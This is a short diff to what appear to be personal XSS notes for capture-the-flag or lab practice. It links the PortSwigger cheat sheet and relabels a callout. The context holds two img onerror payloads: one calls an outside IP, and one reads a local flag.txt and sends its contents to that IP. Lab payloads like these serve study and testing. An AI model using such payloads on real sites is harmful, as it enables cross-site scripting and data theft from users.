@@ -143,7 +143,7 @@ You can [download a PDF version of the XSS cheat sheet](https://portswigger.net/
 [CheetSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 ## Commonly used by ME
 ---
->[!Payloads]
+>[!Hint] Payload
 >`<img src=x onerror="fetch('http://10.11.116.53:8080')"/>`
 >
 >`<img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(r => fetch('http://10.11.116.53:8080/?c=' + r)).catch(e => fetch('http://10.11.116.53:8080/?c=' + e))"/>`
